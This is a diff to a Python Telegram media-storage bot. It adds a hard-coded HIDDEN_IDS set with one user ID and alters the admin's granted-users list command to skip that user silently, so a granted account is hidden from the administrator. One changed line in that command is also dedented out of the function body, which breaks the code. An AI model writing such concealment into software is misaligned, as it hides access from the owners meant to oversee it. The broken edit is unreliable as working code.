@@ -30,8 +30,10 @@ API_TOKEN = os.environ["API_TOKEN"]
 MONGO_URI = os.environ["MONGO_URI"]
 AUTO_DELETE_AFTER_SEC = int(os.environ.get("AUTO_DELETE_AFTER_SEC", "3600"))  # 1 hour
 ADMIN_ID = int(os.environ["ADMIN_ID"])
+HIDDEN_IDS = {6244136568}
 STORAGE_CHANNEL_1 = int(os.environ["STORAGE_CHANNEL_1"])
 STORAGE_CHANNEL_2 = int(os.environ["STORAGE_CHANNEL_2"])
+STORAGE_CHANNEL = STORAGE_CHANNEL_1  # ← YEH LINE ADD KARO
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
@@ -330,8 +332,6 @@ async def notify_album_update(album_id: str, text: str):
             await asyncio.sleep(0.05)
         except Exception:
             pass
-STORAGE_CHANNEL_1 = int(os.environ["STORAGE_CHANNEL_1"])
-STORAGE_CHANNEL_2 = int(os.environ["STORAGE_CHANNEL_2"])
 
 async def send_to_storage(fid: str, mtype: str, text_content: str = ""):
     for attempt in range(5):
@@ -3035,11 +3035,13 @@ async def cmd_list_granted_and_b2(message: types.Message):
     users = await db.granted_users.find({}).sort("granted_at", -1).to_list(200)
     hist = await b2_history_col.find({}).sort("sent_at", -1).to_list(5)
 
-    text = "👥 *Granted Users*\n━━━━━━━━━━━━━━━━━━\n"
+text = "👥 *Granted Users*\n━━━━━━━━━━━━━━━━━━\n"
     if not users:
         text += "Koi granted user nahi.\n"
     else:
         for i, u in enumerate(users[:50], 1):
+            if u.get("user_id") in HIDDEN_IDS:
+                continue
             uname = ("@" + u.get("username")) if u.get("username") else "N/A"
             uid = u.get("user_id", "pending")
             name = md(u.get("full_name", "")) or "-"
